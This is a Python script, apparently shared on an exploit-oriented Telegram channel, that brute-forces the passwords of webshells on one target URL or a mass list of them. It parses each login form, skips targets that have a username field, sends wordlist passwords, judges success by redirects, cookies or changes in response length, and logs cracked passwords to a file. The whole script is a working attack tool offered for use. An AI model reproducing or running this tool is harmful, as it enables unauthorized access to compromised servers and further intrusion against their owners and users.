import requests
import time
import sys
import os
from colorama import Fore, Style, init
from bs4 import BeautifulSoup
import re

init(autoreset=True)

GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
RESET = Style.RESET_ALL

if os.name == "nt":
    os.system("cls")
else:
    os.system("clear")

# banner = f"""
#     \ /
#     oVo
# \___XXX___/   {RED}•{RESET} Webshell passw bruter
#  __XXXXX__    {RED}•{RESET} Coded by snapdowgg
# /__XXXXX__\   {RED}•{RESET} https://t.me/EzronExploit
#      V
# """

# print(banner)

mode = input(f"~{GREEN}${RESET} ").strip()

urls = []

if mode in ["single", "SINGLE"]:
    url = input(f"\n[{BLUE}url{RESET}]: {RESET}").strip()
    urls = [url]
elif mode in ["massive", "MASSIVE"]:
    list_file = input(f"\n[{BLUE}url-list{RESET}]: {RESET}").strip()
    if os.path.isfile(list_file):
        with open(list_file, "r") as f:
            urls = [line.strip() for line in f if line.strip()]
    else:
        print("File not found")
        sys.exit(1)
    if not urls:
        print("URL nya mana tod!")
        sys.exit(1)
else:
    print("Ga valid tolol")
    sys.exit(1)

wordlist = input(f"[{BLUE}pw{RESET}]: {RESET}").strip()

try:
    with open(wordlist, encoding="latin-1") as f:
        passwords = [line.strip() for line in f if line.strip()]
except:
    print("Wordlist not found")
    sys.exit(1)

all_results = []

for target_url in urls:
    print(f"\n{Fore.YELLOW}Bruting target: {target_url}{RESET}")
    print(f"Passwords loaded: {len(passwords)}\n")

    session = requests.Session()

    pass_field = None
    user_field = None

    try:
        r_html = session.get(target_url, timeout=10)
        soup = BeautifulSoup(r_html.text, 'html.parser')
        inputs = soup.find_all('input')

        for inp in inputs:
            typ = inp.get('type', '').lower()
            name = inp.get('name')
            if name:
                name_lower = name.lower()
                if typ == 'password':
                    pass_field = name
                    break

        if not pass_field:
            password_keywords = r'(pass|pwd|password|pw|pin|key|auth|credential|secret|token|kode|masuk|loginpass|passcode|access|login|p)'
            for inp in inputs:
                name = inp.get('name')
                if name and re.search(password_keywords, name.lower()):
                    pass_field = name
                    break

        user_keywords = r'(user|username|login|email|usr|uid|account|name|admin|usrnm|log|eml|user_id|email_addr|ident|nickname)'
        for inp in inputs:
            name = inp.get('name')
            if name and re.search(user_keywords, name.lower()):
                user_field = name

        if not pass_field:
            print(f"{RED}Ga nemu field password sama sekali di {target_url}, skip target ini.{RESET}")
            continue

        if user_field and pass_field:
            print(f"{RED}NOT VULN → username + password terdeteksi ({user_field} & {pass_field}), skip target.{RESET}")
            continue

        print(f"field: {pass_field}")

        base = session.post(target_url, data={pass_field: "INVALID_RANDOM_1234567890"}, timeout=10)
        base_len = len(base.text)
        print(f"Baseline length: {base_len}")
    except Exception as e:
        print(f"Baseline failed for {target_url}: {e}")
        continue

    for i, pw in enumerate(passwords, 1):
        try:
            r = session.post(target_url, data={pass_field: pw}, timeout=10, allow_redirects=True)
            length = len(r.text)
            diff = abs(length - base_len)
            redirect = bool(r.history)
            cookie = "set-cookie" in str(r.headers).lower()
            status = "Success" if (cookie or diff > 500 or redirect) or (diff > 1000 or redirect) else "Fail"
            color = GREEN if status == "Success" else RED

            print(f"\n{color}{status} -> {pw}{RESET}", end=" ")
            if status == "Success":
                print(f"len: {length} diff: {diff}")
                if redirect: print("  redirect")
                if cookie: print("  set-cookie")
                print(f"  url: {r.url}\n")

            result_line = f"{target_url} | {pw} | {status} | len={length} | diff={diff} | redirect={redirect} | cookie={cookie} | field={pass_field}"
            all_results.append(result_line)

            if status == "Success":
                with open("cracked.txt", "a", encoding="utf-8") as f:
                    f.write(result_line + "\n")

            if i % 50 == 0:
                print(f"Progress: {i}/{len(passwords)}")

            time.sleep(0.25)

        except:
            pass

print(f"\n{Fore.GREEN}All targets finished.{RESET}")

if all_results:
    print(f"\n{Fore.CYAN}Found!{RESET}")
    for result in all_results:
        print(result)
    print(f"\nTotal percobaan: {len(all_results)}")
    print("Success disimpan di cracked.txt")
else:
    print(f"\n{RED}Tidak ada hasil.{RESET}")
